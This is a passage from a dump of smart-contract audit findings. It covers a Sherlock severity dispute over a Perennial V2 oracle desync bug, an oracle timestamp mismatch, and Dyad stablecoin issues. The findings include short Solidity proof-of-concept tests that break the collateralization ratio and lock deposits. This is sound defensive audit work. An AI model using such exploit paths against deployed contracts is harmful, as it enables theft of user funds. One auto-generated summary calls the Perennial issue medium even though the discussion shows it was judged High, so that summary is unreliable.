Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Minh-Trng**\n\nThe judging rule explicitly talks about **unintended** future implementation. So your logical continuation would also only be applicable to unintended future implementations (which I would absolutely agree with). \n\nYour submission however even shows that you were aware of the correct **intended** future implementations and the change in likelihood that it would bring. \n\n**panprog**\n\n> The judging rule explicitly talks about **unintended** future implementation.\n\nIt says **OR**: so either unintended future implementation **OR** because of future fix of another issue.\n\nI still think this is high because\n1. Even by itself, it messes up accounting and causes loss of funds if oracle version is invalid. Invalid oracle versions are normal protocol operation, even if rare. This can be compared to liquidations - they're also rare but normal protocol operation, so issues in liquidations are considered high. Similarly, this issue due to invalid oracle version should also be high.\n2. In the current implementation, oracle versions are invalid very frequently due to another bug, so this should be high either way. I still think disregarding the other bugs when considering impact is incorrect. And the fact that I'm aware of the intended future implementation is irrelevant: the way it is right now, the issue in this report happens very frequently by itself.\n\n**141345**\n\nMedium severity seems more appropriate.\n\nBecause:\n- the likelihood that \"oracle version is skipped\" is not common scenario. \n- the loss is not significant.\n\nBased on sherlock's H/M [criteria](https://docs.sherlock.xyz/audits/judging/judging)\n> Medium: There is a viable scenario (even if unlikely) that could cause the protocol to enter a state where a material amount of funds can be lost. The attack path is possible with assumptions that either mimic on-chain conditions or reflect conditions that have a reasonable chance of becoming true in the future. \n\n**panprog**\n\n> * the likelihood that \"oracle version is skipped\" is not common scenario.\n\nIn the current state of the code it is **very likely** scenario (*expected* behavior is for this to be not common scenario, but currently it is common)\n\n> * the loss is not significant.\n\nThis depends. If malicious user want to cause damage (or comes up with a profitable scenario), the loss can be very significant. In the current state of the code - since it will happen often by itself, each instance will not be very significant (0.01-0.2% of the protocol funds depending on price volatility), but it will add up to large amounts over time.\n\n**141345**\n\nAlthough https://github.com/sherlock-audit/2023-07-perennial-judging/issues/42 points out the possibility of skipped version, it does not look like some common events.\n\n0.01-0.2% each time won't be considered material loss. Some normal operation can have even more profit than that, such as spot-futures arbitrage, cross exchange arbitrage.\n\nAnd the attacker need to control the conditions to perform the action. As such, the loss amount and requirements fall into the Med.\n\n**panprog**\n\nI've added a detailed response previously, but don't see it now, maybe it got deleted or not sent properly. Here it is again.\n\n> Although #42 points out the possibility of skipped version, it does not look like some common events.\n\nNo, it's very easy to have skipped versions in the current implementation. For example:\nt=24: user opens postiion (request timestamp = 25, position timestamp = 100)\nt=48: user closes position (request timestamp = 48, position timestamp = 100)\nt=96: user opens position (request timestamp = 96, position timestamp = 100)\nt=108: user closes position (request timestamp = 108, position timestamp = 200)\n...\nIf oracle is commited requested (in the normal operation of the protocol), the commited timestamps will be: 25, 48, 96, 108. Timestamp = 100 will be missing and all position at this timestamp will have invalid oracle version.\nIn order to have a valid oracle version for position, a request to open or close position must be made at exactly the timestamp of the previous positions (t=100 in example). However, a lot of times there won't be even a block with such timestamp. For example, in ethereum blocks are currently happening every 12 seconds and have odd timestamps, and in the other networks the time between blocks is random, so the probability to actually have the block timestamp divisible by granularity is low.\nEven if granularity and block timestamp align well, it still requires that request is made at exactly the granularity timestamp, so for example if granularity = 120 and time between blocks is 12, then every 10th block must have position open in order to request at the right timestamp.\nIt's still possible to commit unrequested, but first, this is not incentivized (as there is no reward to the keeper who commits unrequested) and second, there is still a time window when this has to be commited. So in the example above, commit unrequested for timestamp = 100 can only be done after timestamp = 96 is commited but before the timestamp = 108 is commited. So it's still easy to miss this time window to commit unrequested.\nSo in summary, the way it is now, it's easier to have invalid oracle version, than it is to have valid oracle version.\n\n> 0.01-0.2% each time won't be considered material loss. Some normal operation can have even more profit than that, such as spot-futures arbitrage, cross exchange arbitrage.\n\nI argue that this is actually a material loss - it's the percentage off the **protocol funds**. So if $100M are deposited into protocol, the loss can be like $100K per instance. And since it can happen almost every granularity, this will add up very quick.\n\n> And the attacker need to control the conditions to perform the action. As such, the loss amount and requirements.\n\nEven if there is no attacker, the loss will be smaller, but it will be continuous in time, so even if it's, say, $10K per instance (with $100M deposited), it will add up to tens of millions over less than a day.\n\n**panprog**\n\nRegarding the impact, I want to point that #62 is high and has similar impact (messed up internal accounting), however the real damage from it is:\n\n> The global account's assets and shares should be calculated with toAssetsGlobal and toSharesGlobal respectively, but now, they are calculated with toAssetsLocal and toSharesLocal.\n> toAssetsGlobal subtracts the globalKeeperFees from the global deposited assets, while toAssetsLocal subtracts globalKeeperFees/Checkpoint.count fees from the local account's assets.\n\nSo the real damage from #62 is reduction of deposited assets by (keeper fees / count) instead of (keeper fees). Since keeper fees are low (comparable to gas fees), the real damage is not that large compared to funds deposited (less than 0.001% likely).\n\nHowever, the issue from this report also causes messed up internal accounting, but the real damage depends on position size and price volatility and will be much higher than in #62 on average, even when happening by itself. If coming from malicious parties, this can be a very large amount.\n\nEven though damage in #62 is much easier to inflict, I believe that due to higher damage per instance of this issue, the overall damage over time from this issue will be higher than from #62. Something like:\n$5 per granilarity time from #62 (and still has to be executed by attacker - so the attack has a gas cost of similar amount)\n$10K-$100K per invalid oracle from this one - currently that's maybe once per 10-100 granularities by itself in the current state, so at least $100-$1000 per granularity time (and happens by itself).\n\nSo based on possible real overall damage caused, this issue should be high.\n\n**Emedudu**\n\nThis should be MEDIUM because skipped oracle versions is not a common event.\n\n>In the current state of the code it is very likely scenario (expected behavior is for this to be not common scenario, but currently it is common)\n\nSkipped oracle versions is unlikely, and the reason why it is a likely scenario in the current code is due to a bug, which has already been reported in [#42](https://github.com/sherlock-audit/2023-07-perennial-judging/issues/42).\nFixing [issue 42](https://github.com/sherlock-audit/2023-07-perennial-judging/issues/42) will cause the possibility of this to be unlikely.\nSo, this report is a combination of [issue 42](https://github.com/sherlock-audit/2023-07-perennial-judging/issues/42)(which is already of high severity), and another bug, which is very unlikely by itself.\n\nSince different attack scenarios, with same fixes are considered duplicates, this issue should be a MEDIUM because [issue 42](https://github.com/sherlock-audit/2023-07-perennial-judging/issues/42)(which allows this bug to be a likely scenario) when fixed, will make this issue unlikely\n\n**141345**\n\n1st, the scenario is conditional, not the kind on daily basis.\n2nd, loss magnitude like 0.01-0.2% is common, different exchanges could have that magnitude of price difference, (common arbitrage opportunity, future contracts of different terms can also have larger arbitrage than this).\n\nAs such, conditional loss and capped loss amount, will suggest medium severity.\n\n\n**panprog**\n\n> 1st, the scenario is conditional, not the kind on daily basis.\n\nI don't think high severity means unconditional. My understanding is that high severity is high impact which can happen with rather high probability. And high probability doesn't mean it can happen every transaction, it just means that it can reasonably happen within a week or a month. \nExample (from the other contest): liquidation can be frontrun to block it without spending funds: was judged high, even though liquidation is not very frequent (days can pass without single liquidation). \n\nAnd this issue probability to happen is high. \n\n> 2nd, loss magnitude like 0.01-0.2% is common, different exchanges could have that magnitude of price difference, (common arbitrage opportunity, future contracts of different terms can also have larger arbitrage than this).\n\nWhy do you only consider it as a 1 time event? The way it is now, that'll be like 0.1% per 1-10 minutes, this will add up to 10%+ in less than a day. \n\n> As such, conditional loss and capped loss amount, will suggest medium severity.\n\nI think there are no new arguments presented here, so I keep it up to Sherlock to decide. I think ultimately it comes down to:\n- this issue is high as is now due to the other bug.\n- if the other bug is fixed (and oracle versions work the way they're supposed to work), this one will be medium.\n\nSo my argument is that the way it is now, it's high and severity shouldn't be downgraded as if the other bug is fixed. \n\n**141345**\n\nI don't think it's one time, it's something intermittent, it happens every once in a while, but the frequency might not be as high as per 1-10 minutes.\n\nAnd even it happened, there could be loss, and also sometimes no loss.\n\nThat's why based on the probability of happending and loss, it is more suitable for conditional and capped loss.\n\n**panprog**\n\nI still think this is High, the way it is now - it can happen as often as once per each granularity if malicious user abuses it, or maybe once per 10 granularities with semi-active trading by itself. Either way it's very possible and causes loss of funds.\nAs I said earlier, I see this as medium only if #42 is disregarded, but I don't see any ground to ignore that bug when assessing severity of this one.\n\n**141345**\n\nWhat about the cross exchange price difference, the magnitude could be the same level. Also the spot and perpetual contract could deviates, those cases are not considered exchange's loss.\n\n**panprog**\n\n> What about the cross exchange price difference, the magnitude could be the same level. Also the spot and perpetual contract could deviates, those cases are not considered exchange's loss.\n\nIt's different, they're normal protocol operation and funds just changing hands. This issue leads to mismatch between funds protocol has and funds protocol owes (protocol has 100, but total collateral users can withdraw can be 200, so not all users can withdraw, which can trigger bank run with last users unable to withdraw) \n\n**kbrizzle**\n\nTo chime in here from our perspective -- this issue identified a pretty fundamental flaw in our accounting system that would have caused the markets to be completely out of sync (both w.r.t. positions as well as balances) in the event of an unfortunately timed invalid version.\n\nWhile ideally rare, occasional invalid versions are expected behavior. Invalid versions can occur for a number of reasons during the course of normal operation:\n- Underlying oracle does not have data available for any timestamp in the validity window (occurs in Pyth from time to time)\n- No keeper responds within grace period window\n- Future oracle integration / upgrade adds anomaly detection to invalidate versions via a number of metrics\n\nGiven that this bug would have likely surfaced in normal operation plus its noted effect, our opinion is that this should be marked as High.\n\nFixed in: https://github.com/equilibria-xyz/perennial-v2/pull/82 and https://github.com/equilibria-xyz/perennial-v2/pull/94.\n\n**hrishibhat**\n\nResult:\nHigh\nUnique\nAfter considering all the comments above and discussing this further. \nIn addition to the Sponsor comments above the issue highlights the issues in context with the current state of the codebase. the submission justifies the severity by mentioning another underlying issue in the impact section clearly, which is again pointed out in the escalation. The future implementation rule does not apply here. Also, Agree with the points raised by @panprog in the subsequent comments. \nConsidering this a valid high\n\n**sherlock-admin2**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [panprog](https://github.com/sherlock-audit/2023-07-perennial-judging/issues/49/#issuecomment-1693928072): accepted\n- [Emedudu](https://github.com/sherlock-audit/2023-07-perennial-judging/issues/49/#issuecomment-1694192845): rejected",
      "summary": "\nThis bug report is about an issue found in the perennial-v2 protocol which can cause desynch of global and local positions, leading to the protocol losing funds and being unable to pay back all users. This issue occurs when an oracle version is skipped for any reason, resulting in pending positions being invalidated and reset to the previous latest position. The issue is caused by the code snippet in Market.sol, which invalidates positions if the oracle version is invalid for its timestamp. The code in _settle also loops over global and local positions until the latest oracle version timestamp, invalidating any positions with invalid timestamps.\n\nThe issue was found by manual review and the recommendation is to introduce a map of position timestamp -> oracle version to settle, which will be filled by global position processing. This should eliminate the possibility of different paths for global and local positions.\n\nThe issue has been discussed by various members of the audit team. It was initially considered to be of high severity, however it has been argued that the likelihood of oracle version being skipped is not common, and the loss is not significant. It has been concluded that the issue should be treated as of medium severity according to Sherlock's classification rules, as there is a viable scenario (even if unlikely) that could cause the protocol to enter a state where a material amount of funds can be lost.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-perennial-judging/issues/49",
      "tags": [],
      "finders": [
        "panprog"
      ]
    },
    {
      "id": "24299",
      "title": "H-1: Oracle request timestamp and pending position timestamp mismatch can make most position updates invalid",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-07-perennial-judging/issues/42 \n\n## Found by \nKingNFT, WATCHPUG, minhtrng, panprog\n\nWhen a new pending position is added, its timestamp is set to `currentTimestamp` returned by oracle's `status` function, which is a timestamp at certain granularities rounding up into the future, which means that most of the time it's greater than `block.timestamp`. However, when `request` is called for the oracle, the request timestamp is set to `block.timestamp`. Due to this mismatch, when the oracle price is commited, it is commited with request's timestamp, but when the position is settled, it tries to read the price at position's timestamp, which is a different time. As such, if the oracle price is commited for each request, it's still easily possible that all pending positions will have invalid oracle versions, completely breaking the protocol's functionality.\n\n## Vulnerability Detail\n\nAn example of what happens exactly:\n\n1. PythOracle granularity is set to 100.\n2. User opens position at timestamp = 101. Pending position is stored with timestamp = 200 (because PythOracle returns currentTimestamp = 200)\n3. At the same time `oracle.request()` is called, which stores 101 (current timestamp) into `versionList`\n4. User calls `oracle.commitRequested()`, which stores current price into `_prices[101]`\n5. Later when that pending position is settled, it requests `oracle.at(200)` which doesn't have a price set (is invalid).\n\nThe same will happen to all pending positions - so most of them will easily be invalid, which will completely break the protocol and cause all kinds of problems due to pending positions being invalid and not updating profit and loss properly.\n\n## Impact\n\nThe most straightforward impact is unexpectedly long position commit times and possible funds loss due to this, if the oracle commit flow is the normal expected flow (only commit requested versions). For example:\nT=1:   User A requests to open position long = 1. Position timestamp = 100. Oracle request timestamp = 1\nT=15:  Oracle commits requested version at timestamp = 1, price = $100.\nT=10010: User B requests to open position. Position timestamp = 10100. Oracle request timestamp = 10010\nT=10025: Oracle commits requested version at timestamp = 10010, price = $110.\n\nUser A expects to be filled at price close to $100. However, he's only filled when the next user trades after him, which happens much later than expected with a very different price ($110), so User A has lost $10 unexpectedly. Basically, each user will only be settled when the next user trades. In quiet markets this can lead to very long settlement times and very bad prices for users.\n\nUser A, however, can notice these long waiting times and can fix it by voluntary commiting non-requested versions. For example, he can commit at T=120 and be filled with the correct price. However, this will mean that all commits must be made non-requested, thus they will not be rewarded with the keeper fees. So the user will pay keeper fees when trading, but will also be forced to lose gas fees for oracle commits, so either broken and long waiting times, or broken oracle non-rewarded updates: both are high impacts.\n\nAnother impact is completely broken internal accounting due to a lot of invalid oracle versions. There is a different bug reported by me about desync of global and local positions during invalid oracles. This bug, when coupled with the desync of global and local positions, will lead to catastrophic consequences and complete breakage of accounting of collateral, bank run and loss of funds for users. Scenario of what can (and will) happen:\nUser B has active open position maker=2 with collateral = 100\nT=99: User A opens long=1 with collateral=100: update(0,1,0,100) (pending position timestamp = 100)\nT=101: User A decides to close: update(0,0,0,0) (pending position timestamp = 200)\nT=130: Oracle commited for timestamp=110, price = $100 (user A position at timestamp = 100 is invalid)\nT=150: User B settles: update(2,0,0,0)\nT=220: Oracle commited for timestamp=205, price = $90\nafter settlement of user A and user B:\nuser A will have collateral = $100 (local pending position long = 1 at timestamp = 100 will be invalidated and ignored)\nuser B will have collateral = $110 (global pending position long = 1 will be current at timestamp 110 and accumulate pnl from timestamp 110 to timestamp=205)\n\nSo total deposit of both users is $100 + $100 = $200\nTotal collateral in the end: $100 + $110 = $210\nBut protocol only has $200 in funds, so users will be unable to withdraw everything, which can cause bank run and loss of funds for the last user.\n\nSuch situations will happen all the time by themselves due to lots of invalid oracle versions, so this will mess up accounting completely.\n\nFor the details of this bug, you can refer to my other report.\n\n## Code Snippet\n\n1. Oracle `status()` returns timestamp which is in the future.\n\nOracle `status()` returns timestamp directly from current provider's `status()`:\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/Oracle.sol#L47\n\nPythOracle `status()` timestamp is taken from `current()`, which in turn returns `current()` from PythFactory:\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/pyth/PythOracle.sol#L101\n\nPythFactory `current()` returns timestamp which is granulated into the future using ceilDiv, which rounds up:\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/pyth/PythFactory.sol#L76\n\n2. Pending position's timestamp is taken from oracle `status()`.\n\n`context.currentTimestamp` is set to timestamp from `oracle.status()`:\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L312\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L575\n\nNew pending positions (global and local) timestamp is set to `context.currentTimestamp`:\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L267-L269\n\nAnd `request()` from oracle is done at the same time:\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L284\n\n3. PythOracle `request()` stores `block.timestamp` in the request list (called `versionList`) (**not** `current()` timestamp):\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/pyth/PythOracle.sol#L77-L81\n\n4. PythOracle `commitRequested()` sets price at `versionList` timestamp (i.e. `block.timestamp` at the time `request()` was made)\n\n`versionToCommit` is stored request's timestamp:\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/pyth/PythOracle.sol#L135\n\nThe commit price is stored at the `versionToCommit` timestamp:\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/pyth/PythOracle.sol#L154\nhttps://github.com/sherlock-audit/2023-07-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/pyth/PythOracle.sol#L202-L203\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nMake timestamp of pending positions and timestamp of oracle request match. Record `current()` as a timestamp for the `request()`:\n```solidity\n function request(address) external onlyAuthorized { \n     uint nextTimestamp = current();\n     if (versionList.length == 0 || versionList[versionList.length - 1] < nextTimestamp) { \n         versionList.push(nextTimestamp);\n     } \n } \n```\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**__141345__** commented:\n> h\n\n\n\n**arjun-io**\n\nFixed via: https://github.com/equilibria-xyz/perennial-v2/pull/57",
      "summary": "\nThis bug report is about the Oracle request timestamp and pending position timestamp mismatch which can make most position updates invalid. When a new pending position is added, its timestamp is set to `currentTimestamp` returned by oracle's `status` function, which is a timestamp at certain granularities rounding up into the future, which means that most of the time it's greater than `block.timestamp`. However, when `request` is called for the oracle, the request timestamp is set to `block.timestamp`. This mismatch leads to invalid oracle versions, completely breaking the protocol's functionality. \n\nThe impact of this bug is unexpectedly long position commit times and possible funds loss due to this. For example, if User A opens a position long = 1 at timestamp = 100, and User B opens a position at timestamp = 10100, User A will only be filled when the next user trades after him, which happens much later than expected with a very different price, resulting in unexpected losses. Furthermore, this bug can lead to a bank run and loss of funds for users due to desync of global and local positions. \n\nThe code snippet section explains the details of the bug. Oracle `status()` returns timestamp which is in the future, and pending position's timestamp is taken from oracle `status()`. PythOracle `request()` stores `block.timestamp` in the request list (called `versionList`), and PythOracle `commitRequested()` sets price at `versionList` timestamp. \n\nThe bug was fixed via a pull request. The recommendation is to make timestamp of pending positions and timestamp of oracle request match. Record `current()` as a timestamp for the `request()`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-07-perennial-judging/issues/42",
      "tags": [],
      "finders": [
        "WATCHPUG",
        "KingNFT",
        "panprog",
        "minhtrng"
      ]
    },
    {
      "id": "18771",
      "title": "[L-03] Use SafeMint when minting new dNFTs",
      "impact": "LOW",
      "content": "Both mint() functions to mint new dNFTs have a to field to input who will receive the NFT. This can be dangerous in the event that a user specifies a contract address that is not set up to handle NFTs, and the dNFT gets stuck.\n\nThis is harmful to the user, but also to the protocol. There are a limited number of dNFTs, and there's an expectation that they will be used to provide liquidity and add to the circulating supply of DYAD. Locked dNFTs are a drag on the system.\n\nWhile the current liquidation system would give the ability to take the NFTs from these inactive accounts, the proposed new liquidation system (see #15) does not, so it is important that we do what we can to protect against these errors.\n\n**Recommendations**\nUse the \\_safeMint() function (already included in the imported OpenZeppelin ERC721 contract) instead of \\_mint().\n\n**Review**\nFix confirmed in [PR #18](https://github.com/DyadStablecoin/contracts-v3/pull/18).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-02-12-Dyad.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "18770",
      "title": "[L-02] Missing checks for sending assets to non existent dNFTs",
      "impact": "LOW",
      "content": "There are two places in the code where the user inputs the id of the dNFT they would like to send assets to.\n\n- In deposit(), the user sends msg.value directly to the dNFT\n- In move(), the user sends their own shares to another dNFT\n\nIn both cases, there are no checks to ensure that the receiving dNFT actually exists.\n\nThis could allow users to deposit assets to a non-existent ID that would become permanently trapped in the contract.\n\n**Proof of Concept**\n\n```solidity\nfunction test_CanDepositToNonExistantId() public {\ndNft.deposit{value: 5000 ether}(987654321);\n}\n```\n\n**Recommendation**\nAdd a check in both deposit() and move() to ensure that the ID exists:\n\n```solidity\nfunction deposit(uint id) external payable returns (uint) {\nrequire(id < totalSupply(), \"dNFT does not exist\");\nreturn _deposit(id);\n}\n```\n\n**Review**\nFix confirmed by [PR #11](https://github.com/DyadStablecoin/contracts-v3/pull/11).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-02-12-Dyad.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "18769",
      "title": "[L-01] All permissions are equivalent, so the PermissionsManager system isn't needed",
      "impact": "LOW",
      "content": "The PermissionsManager enforces three types of permissions: MOVE, WITHDRAW, and REDEEM.\n\nHowever, there is no need for such a system, because all three permissions are equivalent:\n\n- A user with MOVE permissions can move shares to another account, and then withdraw or redeem\n- A user with WITHDRAW permissions can withdraw DYAD tokens, transfer them, and either redeposit them into another account (move) or redeem them\n- A user with REDEEM permissions can withdraw ETH, and use it to deposit and withdraw in a new account\n\n**Recommendation**\n\nReplace the PermissionsManager system with a simple approved boolean. We would still need the lastUpdated logic to ensure that old approvals are maintained as dNFTs are transferred.\n\n**Review**\nFix confirmed in [PR #12](https://github.com/DyadStablecoin/contracts-v3/pull/12).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-02-12-Dyad.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "18768",
      "title": "[M-02] Check for stale data before trusting Chainlink's response",
      "impact": "MEDIUM",
      "content": "Much of the math in the protocol is based on the data provided by Chainlink's ETH-USD feed.\n\nAccording to [Chainlink's documentation](https://docs.chain.link/data-feeds/price-feeds/historical-data), it is important to provide additional checks that the data is fresh:\n\n- If answeredInRound is less than roundId, the answer is being carried over.\n- A timestamp with zero value means the round is not complete and should not be used.\n\n**Recommendation**\n\nAdd the following checks to the \\_getEthPrice() function to ensure the data is fresh and accurate:\n\n```solidity\nfunction _getEthPrice() public view returns (uint) {\n(uint80 roundID, int256 price,, uint256 timeStamp, uint80 answeredInRound) = oracle.latestRoundData();\nrequire(timeStamp != 0);\nrequire(answeredInRound >= roundID);\nreturn price.toUint256();\n}\n```\n\n**Review**\nFix confirmed in [PR #10](https://github.com/DyadStablecoin/contracts-v3/pull/10).",
      "summary": "\nThis bug report is about the math in a protocol that is based on the data provided by Chainlink's ETH-USD feed. According to Chainlink's documentation, the data needs to be checked for freshness and accuracy. To do this, the _getEthPrice() function should be updated with two checks, as seen in the code snippet included in the report. This recommendation was reviewed and confirmed in the pull request #10, which can be found in the Github repository for DyadStablecoin contracts-v3.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-02-12-Dyad.md",
      "github_link": "",
      "tags": [
        "Oracle",
        "Validation",
        "Stale Price"
      ],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "18767",
      "title": "[M-01] MIN_MINT_DYAD_DEPOSIT doesn't enforce any behavior on minters",
      "impact": "MEDIUM",
      "content": "The public mint() function includes a requirement that users must submit $5k of ETH in order to mint a new dNFT. However, there is no restriction stopping them from immediately redeeming this deposit back into ETH by calling redeemDeposit().\n\nThe only requirement is that they keep sufficient balance to avoid being liquidated, which is enforced independently from the MIN_MINT_DYAD_DEPOSIT.\n\nThe result is that a user can buy up the full supply of dNFTs for close to free, as they loop through:\n\n- mint() => deposit $5k of ETH\n- redeemDeposit() => cash out up to $5k of ETH\n\nThis becomes a greater risk depending how the liquidation() function is changed, based on #4.\n\n**Recommendations**\n\nThis relies heavily on how you decide to implement liquidations, as it's unclear whether they will solve for this use case.\n\nIn the event that liquidations do not solve this problem (which is my recommendation), consider requiring a minimum number of shares (or value of deposits) that must be maintained by all dNFTs at all times. This will ensure that a fixed amount of the deposited dollars stay in the vault.\n\n**Review**\n\nFix confirmed in [PR #25](https://github.com/DyadStablecoin/contracts-v3/pull/25), [commit 881163c](https://github.com/DyadStablecoin/contracts-v3/commit/881163ceae7316b1b5781e32bd302b561b848721), [PR #30](https://github.com/DyadStablecoin/contracts-v3/pull/30).\n\nThe deposit minimum is still not a true invariant, as a user with minimum deposits could have their deposits lowered by the price of ETH falling. However, the goal of this check is to keep users from disengaging from the system, and there is no harm done or liquidation risk exists from allowing it to fall below the minimum, so this sufficiently accomplishes the goal.",
      "summary": "\nA bug was reported in the public mint() function of the DyadStablecoin contracts-v3, where users were able to mint a new dNFT without any restriction, and then immediately redeem the deposit of $5k of ETH back into ETH, by calling the redeemDeposit() function. This allowed the user to buy up the full supply of dNFTs for close to free.\n\nThe bug was fixed in two Pull Requests (#25 and #30), and a commit (#881163c). The fix is to require a minimum number of shares (or value of deposits) that must be maintained by all dNFTs at all times, to ensure that a fixed amount of the deposited dollars stay in the vault. This will prevent users from disengaging from the system. However, the deposit minimum is still not a true invariant, as a user with minimum deposits could have their deposits lowered by the price of ETH falling.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ZachObront",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/ZachObront/2023-02-12-Dyad.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Zach Obront"
      ]
    },
    {
      "id": "18766",
      "title": "[H-06] Collateralization ratio can be broken by users redeeming deposits for ETH",
      "impact": "HIGH",
      "content": "A key property of the DYAD system is that the collateralization ratio (300%) is maintained. This means that for every 1 DYAD in circulation, there is 3x as much ETH (priced in USD) in the vault.\n\nThis invariant is enforced in the withdraw() function, which stops users from minting more DYAD when such a mint would break the invariant:\n\n```solidity\nfunction withdraw(uint from, address to, uint amount) external\nisNftOwnerOrHasPermission(from, Permission.WITHDRAW)\nisUnlocked(from)\n{\n_subDeposit(from, amount);\n\nuint collatVault    = address(this).balance * _getEthPrice()/1e8;\nuint newCollatRatio = collatVault.divWadDown(dyad.totalSupply() + amount);\nif (newCollatRatio < MIN_COLLATERIZATION_RATIO) { revert CrTooLow(); }\n...\n}\n```\n\nHowever, the same check is not enforced when redeeming ETH out of the contract. Since a key goal is keeping the ratio of circulating DYAD and ETH bounded by this ratio, it is crucial that we enforce this check on both DYAD minting and ETH redeeming.\n\n**Proof of Concept**\n\nHere is a test showing that we can get the collateralization ratio as low as 1:1 by withdrawing all non-minted deposits:\n\n```solidity\nfunction test_CollateralizationRatioBrokenOnRedeemDeposit() public {\n// We deposit 5000 in totalDeposit and mint 1000 of them. Ratio is $5000 of ETH / 1000 supply.\nuint id1 = dNft.mint{value: 5 ether}(address(this));\ndNft.withdraw(id1, address(this), 1000e18);\nconsole.log(_calculateCollateralizationRatio()); // returns 5e18 - success\n\n// We can now withdraw all the remaining ETH with no check.\ndNft.redeemDeposit(id1, address(1), 4000e18);\nconsole.log(_calculateCollateralizationRatio()); // returns 1e18 - uh oh\n}\n\nfunction _calculateCollateralizationRatio() internal returns(uint) {\nuint ETH_PRICE = 1000 * 1e8;\nuint MIN_COLLATERIZATION_RATIO = 3e18;\nuint collatVault = address(dNft).balance * ETH_PRICE/1e8;\nuint newCollatRatio = FixedPointMathLib.divWadDown(collatVault, dyad.totalSupply());\nreturn newCollatRatio;\n}\n```\n\n**Recommendation**\n\nI would recommend moving the collateralization logic into a modifier, as follows:\n\n```solidity\nmodifier collateralizationCheck(uint _amountMinted, uint _amountRedeemed) {\nuint collatVault = (address(this).balance - _dyad2eth(_amountRedeemed)) * _getEthPrice() / 1e8;\nif (dyad.totalSupply() > 0) {\nuint newCollatRatio = collatVault.divWadDown(dyad.totalSupply() + _amountMinted);\nif (newCollatRatio < MIN_COLLATERIZATION_RATIO) { revert CrTooLow(); }\n}\n_;\n}\n```\n\nThis modifier could then be implemented by both the functions listed below:\n\n```solidity\nfunction withdraw(uint from, address to, uint amount) external\nisNftOwnerOrHasPermission(from, Permission.WITHDRAW)\nisUnlocked(from)\ncollateralizationCheck(amount, 0)\n{ ... }\n```\n\nand\n\n```solidity\nfunction redeemDeposit(uint from, address to, uint amount) external\nisNftOwnerOrHasPermission(from, Permission.REDEEM)\nisUnlocked(from)\ncollateralizationCheck(0, amount)\nreturns (uint) { ... }\n```\n\nYou'll note a few small additional changes:\n\n- We need to check whether dyad.totalSupply() == 0 before performing this logic, because the collateralization ratio is infinite before any DYAD has been minted, and we will revert when dividing by zero in our check. This is included in the modifier above.\n- Your existing testCannot_WithdrawCrTooLow test is broken by this change, but it appears this test is incorrect. It is expecting a revert when a dNFT is minted and all is withdrawn, but this situation should be fine, as it does not break any collateralization ratio is there is no DYAD yet in existence.\n\nReview\nFix confirmed in [PR #20](https://github.com/DyadStablecoin/contracts-v3/pull/20/files) by including a mechanism to check individual user collateralization ratios on withdrawals.",
